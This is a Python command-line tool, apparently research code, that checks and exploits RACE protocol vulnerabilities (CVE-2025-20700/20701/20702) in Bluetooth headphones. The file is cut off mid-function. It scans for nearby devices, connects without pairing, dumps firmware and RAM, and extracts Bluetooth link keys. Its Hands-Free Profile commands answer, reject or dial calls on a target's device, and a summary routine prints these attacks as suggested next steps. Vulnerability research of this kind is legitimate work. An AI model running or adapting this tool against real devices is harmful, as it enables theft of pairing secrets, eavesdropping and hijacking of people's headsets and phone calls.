"""RACE Toolkit - A tool for exploiting RACE protocol vulnerabilities in Bluetooth devices.

This toolkit provides utilities for checking CVE-2025-20700, CVE-2025-20701,
and CVE-2025-20702 vulnerabilities, as well as dumping firmware and memory
from affected devices.
"""
import sys
import os
import glob
import struct
import logging
import asyncio
import argparse
import subprocess
import time
import traceback
import fcntl

from dataclasses import dataclass
from enum import Enum, auto

try:
    from usb1 import USBErrorBusy  # type: ignore[import-not-found]
except ImportError:
    # usb1 may not be installed, create a dummy exception
    class USBErrorBusy(Exception):  # type: ignore[no-redef]
        """Dummy exception when usb1 is not available."""

from hexdump import hexdump

from librace.constants import RaceType
from librace.fota import FOTAUpdater
from librace.packets import (
    GetLinkKeyResponse,
    RaceHeader,
    RacePacket,
    GetLinkKey,
    GetSDKInfo,
    BuildVersion,
    GetEDRAddress,
    GetEDRAddressResponse,
)
from librace.transport import (
    Transport,
    GATTBumbleChecker,
    GATTBleakTransport,
    GATTBumbleTransport,
    RFCOMMBumbleChecker,
    RFCOMMTransport,
    USBHIDTransport,
)
from librace.race import RACE
from librace.dumper import (
    RACEDumper,
    RACEFlashDumper,
    RACERAMDumper,
)
from librace.util import setup_logging
from librace.parttable import parse_partition_table


def release_bluetooth_controller(controller: str):
    """Force stop any existing processes holding onto the Bluetooth controller.

    This prevents 'USB device busy' errors when trying to use the controller.
    """
    if not controller.startswith("usb:"):
        return

    logging.info("Releasing Bluetooth controller from system services...")

    # List of services/processes that commonly hold the Bluetooth controller
    services_to_stop = ["bluetooth", "bluetooth.service"]
    processes_to_kill = ["bluetoothd", "bt_stack", "bluetoothctl"]

    # Try to stop systemd services
    for service in services_to_stop:
        try:
            result = subprocess.run(
                ["sudo", "systemctl", "stop", service],
                capture_output=True,
                timeout=5,
                check=False
            )
            if result.returncode == 0:
                logging.debug("Stopped service: %s", service)
        except (subprocess.TimeoutExpired, FileNotFoundError, PermissionError):
            pass

    # Kill any remaining Bluetooth processes
    for proc_name in processes_to_kill:
        try:
            subprocess.run(
                ["sudo", "pkill", "-9", proc_name],
                capture_output=True,
                timeout=5,
                check=False
            )
        except (subprocess.TimeoutExpired, FileNotFoundError, PermissionError):
            pass

    # Give the system a moment to release the device
    time.sleep(0.5)
    logging.debug(
        "Bluetooth controller %s should now be available", controller)


def reset_usb_bluetooth_controller(controller: str) -> bool:
    """Reset a USB Bluetooth controller to clear stuck connections.

    For USB controllers used directly by bumble (usb:VID:PID format),
    we need to do a USB device reset rather than HCI reset.

    Args:
        controller: Controller specification (e.g., "usb:0", "usb:0BDA:8771").

    Returns:
        True if reset was successful, False otherwise.
    """
    if not controller.startswith("usb:"):
        # For non-USB controllers, try HCI reset
        return _reset_hci_controller("hci0")

    logging.info("Resetting USB Bluetooth controller...")

    # Try to find and reset the USB device
    try:
        import usb1
        ctx = usb1.USBContext()

        # Find Bluetooth devices (class 0xE0)
        bt_devices = []
        for dev in ctx.getDeviceList():
            is_bt = False
            try:
                if dev.getDeviceClass() == 0xE0:
                    is_bt = True
                else:
                    for cfg in dev:
                        for intf in cfg:
                            for setting in intf:
                                if setting.getClass() == 0xE0:
                                    is_bt = True
                                    break
            except usb1.USBError:
                pass
            if is_bt:
                bt_devices.append(dev)

        if not bt_devices:
            logging.warning("No USB Bluetooth devices found to reset.")
            return False

        # Reset the first Bluetooth device found
        dev = bt_devices[0]
        vid = dev.getVendorID()
        pid = dev.getProductID()
        bus = dev.getBusNumber()
        addr = dev.getDeviceAddress()

        logging.debug(
            "Resetting USB device %04x:%04x (bus %d, addr %d)...",
            vid, pid, bus, addr
        )

        # Method 1: Try USBDEVFS_RESET ioctl (most reliable)
        # This is the same as running 'usbreset' command
        usbdevfs_reset = 21780  # USBDEVFS_RESET from linux/usbdevice_fs.h
        dev_path = f"/dev/bus/usb/{bus:03d}/{addr:03d}"

        if os.path.exists(dev_path):
            try:
                logging.debug("Resetting via ioctl on %s", dev_path)
                with open(dev_path, 'wb') as f:
                    fcntl.ioctl(f.fileno(), usbdevfs_reset, 0)
                logging.info("USB Bluetooth controller reset successfully.")
                time.sleep(2.0)  # Give device time to reinitialize
                return True
            except PermissionError:
                logging.debug("Permission denied for ioctl, trying sudo...")
                # Try with sudo using usbreset if available
                result = subprocess.run(
                    ["sudo", "usbreset", f"{vid:04x}:{pid:04x}"],
                    capture_output=True, timeout=10, check=False
                )
                if result.returncode == 0:
                    logging.info(
                        "USB Bluetooth controller reset successfully.")
                    time.sleep(2.0)
                    return True
            except (IOError, OSError) as e:
                logging.debug("ioctl reset failed: %s", e)

        # Method 2: Fallback to sysfs authorized file
        sysfs_path = f"/sys/bus/usb/devices/{bus}-*"
        device_paths = glob.glob(sysfs_path)

        for path in device_paths:
            try:
                vendor_path = f"{path}/idVendor"
                product_path = f"{path}/idProduct"
                if os.path.exists(vendor_path) and os.path.exists(product_path):
                    with open(vendor_path, "r", encoding="ascii") as f:
                        dev_vid = int(f.read().strip(), 16)
                    with open(product_path, "r", encoding="ascii") as f:
                        dev_pid = int(f.read().strip(), 16)
                    if dev_vid == vid and dev_pid == pid:
                        auth_path = f"{path}/authorized"
                        if os.path.exists(auth_path):
                            logging.debug("Resetting via %s", auth_path)
                            subprocess.run(
                                ["sudo", "sh", "-c", f"echo 0 > {auth_path}"],
                                capture_output=True, timeout=5, check=False
                            )
                            time.sleep(1.0)
                            subprocess.run(
                                ["sudo", "sh", "-c", f"echo 1 > {auth_path}"],
                                capture_output=True, timeout=5, check=False
                            )
                            time.sleep(3.0)  # Longer wait after sysfs reset
                            logging.info(
                                "USB Bluetooth controller reset successfully."
                            )
                            return True
            except (IOError, OSError, ValueError):
                continue

        # Last resort: just wait longer
        logging.warning(
            "Could not reset USB device. "
            "Waiting for controller to recover..."
        )
        time.sleep(5.0)
        return False

    except ImportError:
        logging.warning("usb1 not available for USB reset")
        return False
    except Exception as e:  # pylint: disable=broad-exception-caught
        logging.warning("USB reset failed: %s", e)
        return False
        return False


def _reset_hci_controller(hci_device: str = "hci0") -> bool:
    """Reset the HCI Bluetooth controller (for built-in adapters).

    Args:
        hci_device: The HCI device name (default: hci0).

    Returns:
        True if reset was successful, False otherwise.
    """
    logging.debug("Attempting HCI reset for %s...", hci_device)
    try:
        # First bring the device down
        subprocess.run(
            ["sudo", "hciconfig", hci_device, "down"],
            capture_output=True,
            timeout=5,
            check=False
        )
        time.sleep(0.3)

        # Then bring it back up
        result = subprocess.run(
            ["sudo", "hciconfig", hci_device, "up"],
            capture_output=True,
            timeout=5,
            check=False
        )

        if result.returncode == 0:
            logging.debug("HCI controller %s reset successfully.", hci_device)
            time.sleep(0.5)
            return True
        else:
            logging.debug(
                "HCI reset failed for %s: %s",
                hci_device,
                result.stderr.decode() if result.stderr else "unknown error"
            )
            return False
    except (subprocess.TimeoutExpired, FileNotFoundError, PermissionError) as e:
        logging.debug("Could not reset HCI controller: %s", e)
        return False


def enumerate_bluetooth_controllers() -> list[tuple[str, str]]:
    """Enumerate available USB Bluetooth controllers.

    Returns:
        List of tuples (controller_spec, description) for each controller found.
    """
    controllers = []
    try:
        import usb1
        ctx = usb1.USBContext()
        for dev in ctx.getDeviceList():
            # Bluetooth class is 0xE0 (Wireless Controller)
            is_bt = False
            try:
                if dev.getDeviceClass() == 0xE0:
                    is_bt = True
                else:
                    for cfg in dev:
                        for intf in cfg:
                            for setting in intf:
                                if setting.getClass() == 0xE0:
                                    is_bt = True
                                    break
            except usb1.USBError:
                pass

            if is_bt:
                vid = dev.getVendorID()
                pid = dev.getProductID()
                try:
                    prod = dev.getProduct() or "Bluetooth Controller"
                except usb1.USBError:
                    prod = "Bluetooth Controller"

                # Build controller spec
                ctrl_spec = f"usb:{vid:04X}:{pid:04X}"
                controllers.append((ctrl_spec, prod))
    except ImportError:
        logging.warning("usb1 not installed, cannot enumerate USB controllers")
    except Exception as e:  # pylint: disable=broad-exception-caught
        logging.debug("Error enumerating controllers: %s", e)

    return controllers


def select_bluetooth_controller(controller: str | None) -> str | None:
    """Select a Bluetooth controller, prompting user if needed.

    Args:
        controller: User-specified controller string, or None to enumerate.

    Returns:
        Controller specification string, or None if none available.
    """
    if controller:
        return controller

    controllers = enumerate_bluetooth_controllers()
    if not controllers:
        logging.error(
            "No USB Bluetooth controllers found. "
            "Please specify --controller manually."
        )
        return None

    if len(controllers) == 1:
        ctrl_spec, prod = controllers[0]
        logging.info("Using Bluetooth controller: %s (%s)", prod, ctrl_spec)
        return ctrl_spec

    # Multiple controllers - let user choose
    logging.info("Available Bluetooth controllers:")
    for i, (ctrl_spec, prod) in enumerate(controllers):
        logging.info("  [%d] %s (%s)", i, prod, ctrl_spec)

    chosen = -1
    while chosen < 0 or chosen >= len(controllers):
        try:
            chosen = int(input("Select controller [0]: ") or "0")
        except ValueError:
            pass

    return controllers[chosen][0]


async def scan_classic_devices(
    controller: str, timeout: float = 10.0
) -> list[tuple[str, str]]:
    """Scan for Bluetooth Classic devices.

    Args:
        controller: Controller specification string.
        timeout: How long to scan in seconds.

    Returns:
        List of tuples (address, name) for each device found.
    """
    from bumble.device import Device, DeviceConfiguration
    from bumble.transport import open_transport_or_link
    from bumble.hci import Address

    devices: dict[str, str] = {}

    try:
        t = await open_transport_or_link(controller)
        config = DeviceConfiguration()
        config.keystore = "JsonKeyStore"
        config.address = Address.generate_static_address()
        config.name = "BumbleRace"
        device = Device.from_config_with_hci(config, t.source, t.sink)
        device.classic_enabled = True
        await device.power_on()

        def on_inquiry_result(
            address, class_of_device, data, rssi  # pylint: disable=unused-argument
        ):
            addr_str = str(address)
            # Try to get name from Extended Inquiry Response
            name = data.get(0x09)  # Complete Local Name
            if not name:
                name = data.get(0x08)  # Shortened Local Name
            if name:
                if isinstance(name, bytes):
                    name = name.decode("utf-8", errors="replace")
                devices[addr_str] = name
            elif addr_str not in devices:
                devices[addr_str] = "(unknown)"

        device.on("inquiry_result", on_inquiry_result)

        logging.info(
            "Scanning for Bluetooth Classic devices (%.0fs)...", timeout
        )
        await device.start_discovery()

        await asyncio.sleep(timeout)

        await device.stop_discovery()
        await t.close()

    except Exception as e:  # pylint: disable=broad-exception-caught
        logging.error("Classic device scan failed: %s", e)

    return list(devices.items())


def select_classic_device(
    devices: list[tuple[str, str]], target_address: str | None
) -> str | None:
    """Select a Bluetooth Classic device, prompting user if needed.

    Args:
        devices: List of (address, name) tuples from scanning.
        target_address: User-specified address, or None to prompt.

    Returns:
        Device address string, or None if none available.
    """
    if target_address:
        return target_address

    if not devices:
        logging.error(
            "No Bluetooth Classic devices found. "
            "Please specify --target-address manually."
        )
        return None

    # Always prompt user to select - even with one device it may not be the right one
    logging.info("Found %d Bluetooth Classic device(s):", len(devices))
    for i, (addr, name) in enumerate(devices):
        logging.info("  [%d] %s (%s)", i, name, addr)
    logging.info("  [X] None of these / Enter address manually")

    while True:
        choice = input("Select device [0]: ").strip() or "0"
        if choice.upper() == "X":
            logging.info(
                "Enter Bluetooth Classic address (AA:BB:CC:DD:EE:FF):")
            manual_addr = input().strip()
            if manual_addr and ":" in manual_addr:
                return manual_addr
            logging.error("Invalid address format.")
            return None
        try:
            idx = int(choice)
            if 0 <= idx < len(devices):
                return devices[idx][0]
        except ValueError:
            pass
        logging.info("Invalid choice, try again.")


def parse_args():
    """Parse command line arguments and return the parsed namespace."""
    parser = argparse.ArgumentParser(description="RACE Toolkit")
    parser.add_argument(
        "-t",
        "--transport",
        choices=["gatt", "bleak", "rfcomm", "usb"],
        default="gatt",
        help="Transport method (default: gatt)",
    )
    parser.add_argument(
        "--target-address", help="Target device Bluetooth classic address to connect to"
    )
    parser.add_argument(
        "--le-names",
        default=None,
        nargs="+",
        help="List of names to scan for if no address is given",
    )
    parser.add_argument(
        "-c",
        "--controller",
        default="usb:0",
        help="Bumble Bluetooth Controller (Required for RFCOMM, default: usb:0)",
    )
    parser.add_argument(
        "-d",
        "--device",
        default=None,
        help="USB device for USBHID transport. Given as VID:PID pair. "
             "By default the transport enumerates all devices and lets you choose.",
    )
    parser.add_argument(
        "--outfile", help="Output file for commands with output (default is stdout)."
    )
    parser.add_argument("--debug", action="store_true",
                        help="Enable debug logging.")
    parser.add_argument(
        "--send-delay",
        type=float,
        default=0.0,
        help="Introduces a send delay between RACE messages. "
             "Might be required for old SDK versions?",
    )
    parser.add_argument(
        "--authenticate",
        action="store_true",
        help="Try to authenticate/pair during connection. Required for devices with pairing issues fixed. Put device into pairing mode and connect with this parameter. Ideally, this only needs to be done once.",
    )

    subparsers = parser.add_subparsers(dest="command", required=True)

    # Check subcommand
    subparsers.add_parser(
        "check",
        help="Check for RACE vulnerabilities (CVE-2025-20700, CVE-2025-20701, CVE-2025-20702).",
    )

    # RAM subcommand
    ram_parser = subparsers.add_parser("ram", help="Read RAM memory")
    ram_parser.add_argument(
        "--address",
        type=lambda x: int(x, 16),
        required=True,
        help="Target address (hex parsed to int)",
    )
    ram_parser.add_argument(
        "--size",
        type=lambda x: int(x, 16),
        required=True,
        help="Number of bytes to dump (must be a multiple of 4)",
    )

    # Flash subcommand
    flash_parser = subparsers.add_parser("flash", help="Dump Flash memory")
    flash_parser.add_argument(
        "--address",
        type=lambda x: int(x, 16),
        required=True,
        help="Start address (hex parsed to int, must be a multiple of 0x100)",
    )
    flash_parser.add_argument(
        "--size",
        type=lambda x: int(x, 16),
        required=True,
        help="Number of bytes to dump (must be a multiple of 0x100)",
    )

    # Link-keys subcommand
    subparsers.add_parser(
        "link-keys", help="RACE Get Link Key Command (Will not work on many devices)"
    )

    # BD addr subcommand
    subparsers.add_parser("bdaddr", help="RACE Get Bluetooth Address Command")

    # Enumerate Classic services subcommand (CVE-2025-20701 PoC)
    subparsers.add_parser(
        "enumerate-classic",
        help="Enumerate Bluetooth Classic services without pairing (CVE-2025-20701 PoC)"
    )

    # Enumerate RACE protocol subcommand (CVE-2025-20702 PoC)
    subparsers.add_parser(
        "enumerate-race",
        help="Enumerate RACE protocol capabilities without auth (CVE-2025-20702 PoC)"
    )

    # HFP Demo subcommand (Hands-Free Profile exploitation)
    hfp_parser = subparsers.add_parser(
        "hfp-demo",
        help="Demonstrate Hands-Free Profile access without pairing (CVE-2025-20701)"
    )
    hfp_parser.add_argument(
        "--action",
        choices=["info", "answer", "reject", "hangup",
                 "dial", "voice", "ring", "volume", "sco-ring"],
        default="info",
        help="HFP action to perform: info (default), answer, reject, hangup, "
             "dial (requires --number), voice, ring (AG only), volume (AG only), "
             "sco-ring (AG only - establish SCO audio and play ringtone)"
    )
    hfp_parser.add_argument(
        "--number",
        type=str,
        help="Phone number to dial (for --action dial) or caller ID (for --action ring)"
    )

    # SDK info subcommand
    subparsers.add_parser("sdkinfo", help="RACE Get SDK Information Command")

    # Build version subcommand
    subparsers.add_parser("buildversion", help="RACE Build Version Command")

    # Mediainfo subcommand
    subparsers.add_parser(
        "mediainfo",
        help="Dump Current Listening Media Info. This is a proof-of-concept. "
             "Only works on some FW versions of Sony WH-CH720N.",
    )

    # Raw subcommand
    raw_parser = subparsers.add_parser(
        "raw", help="Send simple RACE packet with specified ID"
    )
    raw_parser.add_argument(
        "--id",
        type=lambda x: int(x, 16),
        required=True,
        help="ID of RACE command to send",
    )

    # Dump partition subcommand
    subparsers.add_parser(
        "dump-partition", help="Interactively choose and dump a partition"
    )

    # FOTA Update subcommand
    fota_parser = subparsers.add_parser("fota", help="FOTA update")
    fota_parser.add_argument("--fota-file", help="The FOTA file")
    fota_parser.add_argument(
        "--dont-reflash",
        action="store_true",
        default=False,
        help="Prevent FOTA partition from being erased and reflashed. "
             "This is mainly to retry the currently flashed FOTA update.",
    )
    fota_parser.add_argument(
        "--chunks-per-write",
        type=int,
        default=3,
        help="How many chunks should be written in one flash write. "
             "Experiments show 3 works best. Larger numbers might not be possible.",
    )

    # Scan subcommand - discover Bluetooth devices
    scan_parser = subparsers.add_parser(
        "scan",
        help="Discover Bluetooth devices (active scan with device info)"
    )
    scan_parser.add_argument(
        "--mode",
        choices=["classic", "ble", "both"],
        default="classic",
        help="Scan mode: classic (BR/EDR), ble, or both (default: classic)"
    )
    scan_parser.add_argument(
        "--timeout",
        type=float,
        default=10.0,
        help="Scan duration in seconds (default: 10)"
    )
    scan_parser.add_argument(
        "--extended",
        action="store_true",
        help="Use extended inquiry for more device info"
    )

    # Sniff subcommand - passive BLE listening
    sniff_parser = subparsers.add_parser(
        "sniff",
        help="Passive BLE monitoring - continuous advertisement capture (research tool)"
    )
    sniff_parser.add_argument(
        "--timeout",
        type=float,
        default=0,
        help="Sniff duration in seconds (0 = continuous, Ctrl+C to stop)"
    )
    sniff_parser.add_argument(
        "--filter",
        type=str,
        help="Filter by device name (substring match)"
    )
    sniff_parser.add_argument(
        "--filter-addr",
        type=str,
        help="Filter by MAC address (prefix match)"
    )
    sniff_parser.add_argument(
        "--show-raw",
        action="store_true",
        help="Show raw advertisement data bytes"
    )
    sniff_parser.add_argument(
        "--show-uuids",
        action="store_true",
        help="Show advertised service UUIDs"
    )
    sniff_parser.add_argument(
        "--active",
        action="store_true",
        help="Use active scanning (sends scan requests to get device names)"
    )

    # BLE Info subcommand - enumerate BLE device information
    ble_info_parser = subparsers.add_parser(
        "ble-info",
        help="Enumerate BLE GATT services without auth (CVE-2025-20700 PoC)"
    )
    ble_info_parser.add_argument(
        "--timeout",
        type=float,
        default=30.0,
        help="Connection timeout in seconds (default: 30)"
    )

    # BLE Speaker Control PoC (Experimental)
    ble_speaker_parser = subparsers.add_parser(
        "ble-speaker",
        help="[EXPERIMENTAL] BLE speaker control PoC - vendor-specific characteristics (limited success)"
    )
    ble_speaker_parser.add_argument(
        "--action",
        choices=["probe", "play", "pause", "next", "prev",
                 "vol-up", "vol-down", "mute", "read-all", "write-test"],
        default="probe",
        help="Action: probe (discover controls), play, pause, next, prev, vol-up, vol-down, mute, read-all (read all characteristics), write-test (probe writable chars)"
    )
    ble_speaker_parser.add_argument(
        "--char-uuid",
        type=str,
        help="Specific characteristic UUID to interact with"
    )
    ble_speaker_parser.add_argument(
        "--write-data",
        type=str,
        help="Hex data to write (e.g., '01020304' or 'play' for common commands)"
    )
    ble_speaker_parser.add_argument(
        "--timeout",
        type=float,
        default=30.0,
        help="Connection timeout in seconds (default: 30)"
    )

    # AVRCP Classic Bluetooth Media Control (Experimental)
    avrcp_parser = subparsers.add_parser(
        "avrcp",
        help="[EXPERIMENTAL] AVRCP media control via Classic Bluetooth - may fail if device connected elsewhere"
    )
    avrcp_parser.add_argument(
        "--action",
        choices=["info", "play", "pause", "stop", "next", "prev",
                 "vol-up", "vol-down", "mute", "ff", "rewind"],
        default="info",
        help="Action: info (show device info), play, pause, stop, next, prev, vol-up, vol-down, mute, ff (fast-forward), rewind"
    )
    avrcp_parser.add_argument(
        "--repeat",
        type=int,
        default=1,
        help="Number of times to repeat the action (default: 1)"
    )
    avrcp_parser.add_argument(
        "--hold-time",
        type=float,
        default=0.1,
        help="Time to hold button in seconds (default: 0.1)"
    )
    avrcp_parser.add_argument(
        "--timeout",
        type=float,
        default=30.0,
        help="Connection timeout in seconds (default: 30)"
    )

    return parser.parse_args()


def init_transport(args: argparse.Namespace) -> Transport:
    """Initialize the transport based on the given arguments.

    Raises:
        ValueError: If required arguments are missing or transport type is unknown.
    """
    transport_type = args.transport.lower()

    # Release Bluetooth controller for transports that need it
    if transport_type in ("rfcomm", "gatt"):
        release_bluetooth_controller(args.controller)

    if transport_type == "rfcomm":
        if args.target_address is None:
            raise ValueError("RFCOMM transport needs --target-address!")
        return RFCOMMTransport(args.controller, args.target_address, args.authenticate)
    elif transport_type == "bleak":
        return GATTBleakTransport(args.target_address, args.le_names)
    elif transport_type == "gatt":
        return GATTBumbleTransport(
            args.controller, args.target_address, args.le_names, args.authenticate
        )
    elif transport_type == "usb":
        return USBHIDTransport(args.device)
    else:
        raise ValueError(f"Unknown transport type: {args.transport}")


class VulnerabilityStatus(Enum):
    """Status of a vulnerability check."""
    UNKNOWN = auto()
    FIXED = auto()
    VULNERABLE = auto()
    NOT_APPLICABLE = auto()


@dataclass
class Vulnerability:
    """Represents a vulnerability with its check status."""
    id: str
    description: str
    status: VulnerabilityStatus = VulnerabilityStatus.UNKNOWN


def _noop_recv(_data: bytes) -> None:
    """No-op receive callback for setup calls that don't need data handling."""


def _get_vuln(vulnerabilities: list[Vulnerability], vuln_id: str) -> Vulnerability:
    """Get a vulnerability by ID. Raises KeyError if not found."""
    for v in vulnerabilities:
        if v.id == vuln_id:
            return v
    raise KeyError(f"Vulnerability {vuln_id} not found")


def _is_valid_dump(data: bytes, threshold: float = 0.95) -> bool:
    """Check if dump data appears to be valid (not mostly zeros or repeating pattern).

    Args:
        data: The dump data to validate.
        threshold: Maximum percentage of zeros allowed (default 95%).

    Returns:
        True if the dump appears to contain valid data.
    """
    if not data or len(data) == 0:
        return False

    # Count zero bytes
    zero_count = data.count(b'\x00'[0])
    zero_ratio = zero_count / len(data)

    if zero_ratio > threshold:
        logging.warning(
            "Dump data is %.1f%% zeros - likely invalid/garbage data",
            zero_ratio * 100
        )
        return False

    # Check for suspicious repeating patterns (like every 0x100 bytes)
    if len(data) >= 0x200:
        # Check if data repeats at 0x100 boundaries
        chunk_size = 0x100
        first_chunk = data[:chunk_size]
        repeat_count = 0
        for i in range(chunk_size, min(len(data), chunk_size * 8), chunk_size):
            if data[i:i + chunk_size] == first_chunk:
                repeat_count += 1
        if repeat_count >= 3:  # Same pattern repeated 4+ times
            logging.warning(
                "Dump data shows repeating pattern - likely error responses"
            )
            return False

    return True


def _print_vulnerability_summary(
    vulnerabilities: list[Vulnerability],
    bdaddr: str | bytes | None = None,
    controller: str = "usb:0"
) -> None:
    """Print a summary of vulnerability check results with actionable suggestions."""
    logging.info("Vulnerability status summary:")
    for v in vulnerabilities:
        logging.info("  [%-10s] %s: %s", v.status.name, v.id, v.description)

    # Collect vulnerable items for suggestions
    vulnerable = [v for v in vulnerabilities
                  if v.status == VulnerabilityStatus.VULNERABLE]

    if not vulnerable:
        return

    logging.info("")
    logging.info("=" * 60)
    logging.info("SUGGESTED NEXT STEPS")
    logging.info("=" * 60)

    # Convert bdaddr to string if needed
    addr_str: str | None = None
    if isinstance(bdaddr, bytes):
        addr_str = bdaddr.decode("ascii", errors="ignore")
    elif isinstance(bdaddr, str):
        addr_str = bdaddr

    addr_arg = f"--target-address {addr_str}" if addr_str else "--target-address <device_address>"

    for v in vulnerable:
        logging.info("")
        if v.id == "CVE-2025-20700":
            logging.info("[%s] GATT Authentication Bypass", v.id)
            logging.info("  The device allows unauthenticated GATT access.")
            logging.info("  Try extracting sensitive data:")
            logging.info("")
            logging.info("  # Dump firmware from flash memory:")
            logging.info("    python race_toolkit.py %s flash -o firmware.bin",
                         addr_arg)
            logging.info("")
            logging.info("  # Extract Bluetooth link keys (pairing secrets):")
            logging.info("    python race_toolkit.py %s link-keys", addr_arg)
            logging.info("")
            logging.info("  # Get device Bluetooth address:")
            logging.info("    python race_toolkit.py %s bdaddr", addr_arg)

        elif v.id == "CVE-2025-20701":
            logging.info("[%s] BR/EDR Authentication Bypass", v.id)
            logging.info("  The device accepts connections WITHOUT pairing!")
            logging.info(
                "  An attacker can connect to Bluetooth profiles directly.")
            logging.info("")
            logging.info("  # Enumerate accessible RFCOMM services:")
            logging.info(
                "    python race_toolkit.py -c %s %s enumerate-classic",
                controller, addr_arg
            )
            logging.info("")
            logging.info("  # Check for RACE protocol exposure:")
            logging.info(
                "    python race_toolkit.py -c %s %s enumerate-race",
                controller, addr_arg
            )
            logging.info("")
            logging.info(
                "  # Exploit Hands-Free Profile (answer/make calls!):")
            logging.info(
                "    python race_toolkit.py -c %s %s hfp-demo",
                controller, addr_arg
            )
            logging.info(
                "    python race_toolkit.py -c %s %s hfp-demo --action answer",
                controller, addr_arg
            )
            logging.info(
                "    python race_toolkit.py -c %s %s hfp-demo --action dial --number 1234567890",
                controller, addr_arg
            )

        elif v.id == "CVE-2025-20702_LE":
            logging.info("[%s] RACE Protocol via BLE", v.id)
            logging.info(
                "  The RACE debug protocol is exposed over Bluetooth LE!")
            logging.info("  Try extracting sensitive data:")
            logging.info("")
            logging.info("  # Dump firmware from flash:")
            logging.info("    python race_toolkit.py %s flash -o firmware.bin",
                         addr_arg)
            logging.info("")
            logging.info("  # Dump RAM for secrets/keys:")
            logging.info(
                "    python race_toolkit.py %s ram --address 0x0 --size 0x10000 -o ram.bin",
                addr_arg
            )
            logging.info("")
            logging.info("  # Extract Bluetooth link keys:")
            logging.info("    python race_toolkit.py %s link-keys -o keys.bin",
                         addr_arg)

        elif v.id == "CVE-2025-20702_BR_EDR":
            logging.info("[%s] RACE Protocol via Bluetooth Classic", v.id)
            logging.info(
                "  The RACE debug protocol is exposed over Bluetooth Classic!"
            )
            logging.info("  Try extracting sensitive data:")
            logging.info("")
            logging.info("  # Dump firmware from flash:")
            logging.info(
                "    python race_toolkit.py -c %s %s flash -o firmware.bin",
                controller, addr_arg
            )
            logging.info("")
            logging.info("  # Dump RAM for secrets/keys:")
            logging.info(
                "    python race_toolkit.py -c %s %s ram --address 0x0 --size 0x10000 -o ram.bin",
                controller, addr_arg
            )
            logging.info("")
            logging.info("  # Extract Bluetooth link keys:")
            logging.info(
                "    python race_toolkit.py -c %s %s link-keys -o keys.bin",
                controller, addr_arg
            )

    logging.info("")
    logging.info("=" * 60)


async def command_check(args: argparse.Namespace):
    """Check device for RACE vulnerabilities and optionally dump firmware."""
    vulnerabilities = [
        Vulnerability("CVE-2025-20700", "Missing GATT authentication"),
        Vulnerability("CVE-2025-20701", "Missing BR/EDR authentication"),
        Vulnerability("CVE-2025-20702_LE", "RACE Protocol via BLE"),
        Vulnerability("CVE-2025-20702_BR_EDR",
                      "RACE Protocol via Bluetooth Classic"),
    ]

    # Collected firmware dumps from vulnerability checks
    collected_dumps = {}

    logging.info("Starting device check.")

    # Select controller if not specified
    controller = select_bluetooth_controller(args.controller)
    if not controller:
        return

    # Release the Bluetooth controller before starting
    release_bluetooth_controller(controller)

    bdaddr = args.target_address

    # Check if we have a Classic address format (contains colons, like AA:BB:CC:DD:EE:FF)
    # If so, skip BLE scanning and go straight to Classic checks
    skip_ble = False
    if bdaddr and ":" in bdaddr and len(bdaddr) == 17:
        logging.info(
            "Bluetooth Classic address provided (%s), skipping BLE scan.",
            bdaddr
        )
        skip_ble = True
        # Mark BLE vulns as not applicable since we're skipping
        _get_vuln(vulnerabilities,
                  "CVE-2025-20700").status = VulnerabilityStatus.NOT_APPLICABLE
        _get_vuln(vulnerabilities,
                  "CVE-2025-20702_LE").status = VulnerabilityStatus.NOT_APPLICABLE

    if not skip_ble:
        logging.info("Step 1: Scanning Bluetooth Low Energy devices.")
        logging.info("Scanning for 5 seconds...")

        # Step 1: BLE Checks.
        # - first check if the device is available via BLE
        # - then check for UUIDs that we know about
        # - lasty, connect to the device and try the following
        #   - read from flash
        #   - get bdaddr for Classic checks
        le_checker = GATTBumbleChecker(controller, args.target_address)
        await le_checker.setup(_noop_recv)
        scan_res = await le_checker.scan_devices()
        if scan_res:
            addr, dev_name = scan_res
            logging.info(
                "Your device is %s (%s). Trying to identify RACE UUIDs via GATT.",
                dev_name, addr
            )
            try:
                uuid_found = await le_checker.check_UUIDs(addr)
            except asyncio.CancelledError:
                logging.warning(
                    "BLE connection was cancelled. The device may have disconnected."
                )
                uuid_found = False
            except (OSError, ConnectionError, BrokenPipeError) as e:
                logging.warning("BLE connection error: %s", e)
                uuid_found = False

            if uuid_found:
                _get_vuln(vulnerabilities,
                          "CVE-2025-20700").status = VulnerabilityStatus.VULNERABLE

                logging.info(
                    "Initiating a proper BLE connection to %s on %s.",
                    dev_name, addr
                )
                le_transport = GATTBumbleTransport(controller, addr, [], False)
                le_transport.connection = le_checker.connection
                le_transport.device = le_checker.device
                await le_transport.setup_gatt(_noop_recv)
                r = RACE(le_transport, args.send_delay)
                logging.info("Trying to read flash via BLE.")
                d = RACEFlashDumper(r, 0x08000000, 0x1000)
                # try to dump with a 10-second timeout
                status = VulnerabilityStatus.FIXED
                try:
                    dump_data = await asyncio.wait_for(d.dump(), 10.0)
                    # Check if we got valid data or just error responses
                    if dump_data and _is_valid_dump(dump_data):
                        status = VulnerabilityStatus.VULNERABLE
                        collected_dumps["ble_flash"] = dump_data
                    elif d.had_errors:
                        logging.warning(
                            "Flash dump had errors - "
                            "device may have partial protections"
                        )
                    else:
                        logging.warning(
                            "Flash dump returned invalid/empty data"
                        )
                except asyncio.TimeoutError:
                    logging.warning(
                        "Timeout! Unable to dump flash within 10 seconds. "
                        "Device might be fixed!"
                    )
                except (OSError, ConnectionError, BrokenPipeError) as e:
                    logging.warning(
                        "Unable to dump flash. Device might be fixed! Error is %s",
                        e
                    )
                _get_vuln(vulnerabilities, "CVE-2025-20702_LE").status = status

                r = RACE(le_transport, args.send_delay)
                await r.setup()
                if not bdaddr:
                    try:
                        logging.info(
                            "Trying to obtain the Bluetooth Classic address "
                            "for next step."
                        )
                        await asyncio.wait_for(
                            r.send_sync(GetEDRAddress()), 8.0
                        )
                        bdaddr = GetEDRAddressResponse.unpack(
                            r.sync_payload).bd_addr
                        bdaddr = ":".join(f"{byte:02X}" for byte in bdaddr)
                        logging.info(
                            "Got Bluetooth Classic address %s", bdaddr
                        )
                    except asyncio.TimeoutError:
                        logging.warning(
                            "Timeout! Unable to retrieve Bluetooth Classic "
                            "address within 8 seconds. The RACE command might "
                            "be unavailable, which is expected for many devices."
                        )
                    except (OSError, ConnectionError, BrokenPipeError) as e:
                        logging.warning("Error receiving BD addr: %s.", e)

                await le_transport.close()
                await le_checker.close()
            else:
                # uuid_found was False - close the checker and mark as not vulnerable
                logging.info("No known RACE UUIDs found via GATT.")
                logging.info("")
                logging.info(
